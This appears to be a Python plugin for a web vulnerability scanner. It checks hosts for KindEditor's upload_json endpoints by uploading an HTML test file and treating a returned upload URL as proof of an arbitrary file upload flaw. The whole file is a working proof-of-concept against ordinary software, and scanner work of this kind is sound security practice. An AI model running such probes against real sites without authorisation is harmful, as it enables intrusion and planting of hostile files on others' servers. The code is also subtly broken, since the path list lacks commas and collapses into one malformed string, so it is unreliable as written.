#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import json
from aiohttp import FormData
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB
        self.poc_list = [
            "kindeditor/php/upload_json.php?dir=file"
            "kindeditor/jsp/upload_json.jsp?dir=file"
            "kindeditor/asp/upload_json.asp?dir=file"
            "kindeditor/jspx/upload_json.jspx?dir=file"
            "kindeditor/aspx/upload_json.aspx?dir=file"
        ]

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    if path[-1] == '/':
                        for poc in self.poc_list:
                            url = path + poc
                            data = FormData()
                            data.add_field('imgFile',
                                           "this is a test for you. ",
                                           filename='mytestforyou.html',
                                           content_type='text/plain')
                            async with session.post(url=url, data=data) as res:
                                if res!=None:
                                    text = await res.text()
                                    try:
                                        res = json.loads(text)
                                        if 'url'in res.keys() and 'kindeditor' in res['url']:
                                            yield url
                                    except:

                                        pass